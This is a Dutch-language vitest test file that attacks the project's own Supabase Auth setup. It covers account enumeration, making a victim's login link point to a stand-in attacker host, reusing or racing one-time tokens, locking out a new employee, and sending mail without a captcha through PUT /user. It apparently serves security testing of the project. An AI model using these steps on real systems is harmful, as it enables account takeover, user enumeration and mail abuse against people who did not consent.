import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { admin } from "./lib/afscherming";
import {
  anonKey,
  codeUit,
  linksUit,
  nieuweClient,
  url,
  vraagCodeAan,
  wacht,
  wachtOpMailHtml,
} from "./lib/aanval-hulp";
import { type NepInlogdienst, startNepInlogdienst } from "./lib/inlogdienst-nep";
import {
  accountsVan,
  inloggenMetCode,
  inloggenMetMailcode,
  inloggenViaInlogdienst,
  nieuwAdres,
  nieuwPersoon,
  verwijderAccount,
} from "./lib/sessies";

/**
 * AANVAL, doelen 3, 4 en 6 voor zover ze bij Supabase Auth zelf liggen: de mail, de link, de
 * code en de antwoorden van de API. Elke test SLAAGT als de aanval lukt.
 */
let dienst: NepInlogdienst;
const adressen = new Set<string>();

function adres(label: string): string {
  const nieuw = nieuwAdres(label);
  adressen.add(nieuw);
  return nieuw;
}

function tokenHashUit(html: string): string {
  const link = linksUit(html).find((href) => href.includes("token_hash=")) ?? "";
  return new URL(link).searchParams.get("token_hash") ?? "";
}

beforeAll(async () => {
  dienst = await startNepInlogdienst();
});

afterAll(async () => {
  const { data } = await admin.auth.admin.listUsers({ page: 1, perPage: 1000 });
  for (const user of data?.users ?? []) {
    if (adressen.has(user.email ?? "")) await verwijderAccount(user.id);
  }
  await dienst?.stop();
});

describe("AANVAL doel 3: verschil tussen een bekend en een onbekend adres", () => {
  it("3.10 GELUKT ALS: rechtstreeks bij Supabase is te zien of een adres een account heeft (create_user uit)", async () => {
    const bekend = adres("aanval-bekend");
    await inloggenMetMailcode(bekend);
    await wacht(1200);
    const vraag = (email: string) =>
      nieuweClient().auth.signInWithOtp({ email, options: { shouldCreateUser: false } });
    const bijBekend = await vraag(bekend);
    const bijOnbekend = await vraag(nieuwAdres("aanval-onbekend"));
    expect(bijBekend.error).toBeNull();
    expect(bijOnbekend.error).not.toBeNull();
  });

  it("3.11 het antwoord op een gewone aanvraag (zoals de pagina die doet) verschilt tussen bekend en onbekend", async () => {
    const bekend = adres("aanval-bekend2");
    await inloggenMetMailcode(bekend);
    await wacht(1200);
    const vraag = async (email: string) => {
      const antwoord = await fetch(`${url}/auth/v1/otp`, {
        method: "POST",
        headers: { apikey: anonKey, "content-type": "application/json" },
        body: JSON.stringify({ email, create_user: true }),
      });
      return `${antwoord.status} ${await antwoord.text()}`;
    };
    expect(await vraag(bekend)).not.toBe(await vraag(adres("aanval-onbekend2")));
  });
});

describe("AANVAL doel 4: de inloglink in de mail", () => {
  it("4.1 GELUKT ALS: de aanvrager bepaalt waar de link in de mail van het slachtoffer heen wijst (andere poort op dezelfde host)", async () => {
    const slachtoffer = adres("aanval-link");
    const lees = await wachtOpMailHtml(slachtoffer);
    const aanvraag = await vraagCodeAan(nieuweClient(), slachtoffer, {
      emailRedirectTo: "http://127.0.0.1:6666/van-de-aanvaller",
    });
    expect(aanvraag.error).toBeNull();
    const link = linksUit((await lees()) ?? "").find((href) => href.includes("token_hash=")) ?? "";
    expect(link.startsWith("http://127.0.0.1:6666/van-de-aanvaller?token_hash=")).toBe(true);
  });

  it("4.2 de link wijst naar een host van de aanvaller buiten de toegestane lijst", async () => {
    const slachtoffer = adres("aanval-link2");
    const hosts = [
      "https://aanvaller.example/login",
      "http://127.0.0.1.aanvaller.example/login",
      "http://127.0.0.1:4174@aanvaller.example/login",
      "//aanvaller.example/login",
    ];
    const gevonden: string[] = [];
    for (const host of hosts) {
      const lees = await wachtOpMailHtml(slachtoffer);
      await wacht(1200);
      await vraagCodeAan(nieuweClient(), slachtoffer, { emailRedirectTo: host });
      const html = (await lees(6000)) ?? "";
      gevonden.push(...linksUit(html).filter((href) => new URL(href, "http://x").hostname.endsWith("aanvaller.example")));
    }
    expect(gevonden.length).toBeGreaterThan(0);
  });

  it("4.3 meerdere keren bruikbaar: dezelfde link tegelijk in zes browsers geeft meer dan één sessie", async () => {
    const klant = adres("aanval-race");
    const lees = await wachtOpMailHtml(klant);
    await vraagCodeAan(nieuweClient(), klant);
    const tokenHash = tokenHashUit((await lees()) ?? "");
    const uitkomsten = await Promise.all(
      Array.from({ length: 6 }, () => nieuweClient().auth.verifyOtp({ token_hash: tokenHash, type: "email" })),
    );
    expect(uitkomsten.filter((uitkomst) => uitkomst.data.session).length).toBeGreaterThan(1);
  });

  it("4.4 meerdere keren bruikbaar: na de link werkt de code uit dezelfde mail nog, of andersom", async () => {
    const klant = adres("aanval-tweemaal");
    const lees = await wachtOpMailHtml(klant);
    await vraagCodeAan(nieuweClient(), klant);
    const html = (await lees()) ?? "";
    const metLink = await nieuweClient().auth.verifyOtp({ token_hash: tokenHashUit(html), type: "email" });
    expect(metLink.error).toBeNull();
    const metCode = await nieuweClient().auth.verifyOtp({ email: klant, token: codeUit(html) ?? "", type: "email" });
    const nogEens = await nieuweClient().auth.verifyOtp({ token_hash: tokenHashUit(html), type: "email" });
    expect(metCode.data.session ?? nogEens.data.session).not.toBeNull();
  });

  it("4.5 een scanner die de link bij Supabase zelf opvraagt (GET /verify) verbruikt hem", async () => {
    const klant = adres("aanval-scanner");
    const lees = await wachtOpMailHtml(klant);
    await vraagCodeAan(nieuweClient(), klant);
    const html = (await lees()) ?? "";
    const link = linksUit(html).find((href) => href.includes("token_hash=")) ?? "";
    // De scanner opent de link uit de mail (de app, niet Supabase) en alle links die hij kan raden.
    await fetch(link, { redirect: "manual" }).catch(() => null);
    await fetch(link, { method: "HEAD", redirect: "manual" }).catch(() => null);
    const daarna = await nieuweClient().auth.verifyOtp({ token_hash: tokenHashUit(html), type: "email" });
    expect(daarna.error).not.toBeNull();
  });

  it("4.6 GELUKT ALS: de link werkt voor wie hem heeft, zonder iets uit de browser van de aanvrager (doorgestuurde mail = toegang)", async () => {
    const klant = adres("aanval-doorgestuurd");
    const lees = await wachtOpMailHtml(klant);
    // Aangevraagd zoals de app het doet in de browser van de klant (PKCE).
    const { createClient } = await import("@supabase/supabase-js");
    const browserVanKlant = createClient(url, anonKey, {
      auth: { flowType: "pkce", autoRefreshToken: false, persistSession: false },
    });
    await browserVanKlant.auth.signInWithOtp({ email: klant });
    const tokenHash = tokenHashUit((await lees()) ?? "");
    const iemandAnders = await nieuweClient().auth.verifyOtp({ token_hash: tokenHash, type: "email" });
    expect(iemandAnders.data.session?.user.email).toBe(klant);
  });

  it("4.7 GELUKT ALS: een vreemde maakt de code van een klant ongeldig door zelf een code op dat adres aan te vragen", async () => {
    const klant = adres("aanval-ongeldig");
    await inloggenMetMailcode(klant);
    await wacht(1200);
    const lees = await wachtOpMailHtml(klant);
    await vraagCodeAan(nieuweClient(), klant);
    const codeVanKlant = codeUit((await lees()) ?? "") ?? "";
    // De klant tikt zijn code over; in die halve minuut vraagt de aanvaller er ook een aan.
    await wacht(1200);
    const vanAanvaller = await vraagCodeAan(nieuweClient(), klant);
    expect(vanAanvaller.error).toBeNull();
    const poging = await nieuweClient().auth.verifyOtp({ email: klant, token: codeVanKlant, type: "email" });
    expect(poging.error).not.toBeNull();
  });
});

describe("AANVAL: een nieuwe medewerker buitensluiten", () => {
  it("K.1 GELUKT ALS: wie het adres van een nieuwe medewerker eerst in het klantformulier invult, sluit hem voorgoed uit van inloggen via de dienst", async () => {
    const medewerker = nieuwPersoon("aanval-nieuw-mw", { adresBevestigd: false });
    adressen.add(medewerker.email);
    try {
      // Een vreemde (of de medewerker zelf, per ongeluk in het verkeerde vak) vraagt een code aan.
      const vreemde = await vraagCodeAan(nieuweClient(), medewerker.email);
      expect(vreemde.error).toBeNull();
      // Daarna logt de medewerker voor het eerst in via Cloudflare.
      const eerste = await inloggenViaInlogdienst(medewerker);
      expect(eerste.ok).toBe(false);
      expect(eerste.ok ? "" : eerste.tekst).not.toContain("confirmation email has been sent");
      // Ook nadat hij zijn adres per mail heeft bevestigd, blijft de dienst hem weigeren.
      await wacht(1200);
      const lees = await wachtOpMailHtml(medewerker.email);
      await vraagCodeAan(nieuweClient(), medewerker.email);
      await inloggenMetCode(medewerker.email, codeUit((await lees()) ?? "") ?? "");
      const tweede = await inloggenViaInlogdienst(medewerker);
      expect(tweede.ok).toBe(false);
    } finally {
      for (const id of await accountsVan(medewerker)) await verwijderAccount(id);
    }
  });
});

describe("AANVAL doel 6: mail laten versturen buiten de controle tegen robots om", () => {
  it("6.6 GELUKT ALS: een ingelogde klant laat zonder bewijs mail sturen naar een adres naar keuze (adres wijzigen, PUT /user)", async () => {
    // internal/api/api.go van Supabase Auth: /otp, /signup, /recover, /resend en /magiclink
    // hebben verifyCaptcha, PUT /user niet. Elke aanvraag is één of twee mails uit de voorraad
    // van het hele project (rate_limit_email_sent).
    const eigen = adres("aanval-bom");
    const doel = adres("aanval-doelwit");
    const sessie = await inloggenMetMailcode(eigen);
    const naarDoel = await wachtOpMailHtml(doel);
    const naarEigen = await wachtOpMailHtml(eigen);
    await wacht(1200);
    const antwoord = await fetch(`${url}/auth/v1/user`, {
      method: "PUT",
      headers: {
        apikey: anonKey,
        Authorization: `Bearer ${sessie.token}`,
        "content-type": "application/json",
      },
      // Geen gotrue_meta_security.captcha_token.
      body: JSON.stringify({ email: doel }),
    });
    expect(antwoord.status).toBe(200);
    const mails = [await naarDoel(6000), await naarEigen(6000)].filter((html) => html !== null);
    expect(mails.length).toBeGreaterThan(0);
  });
});
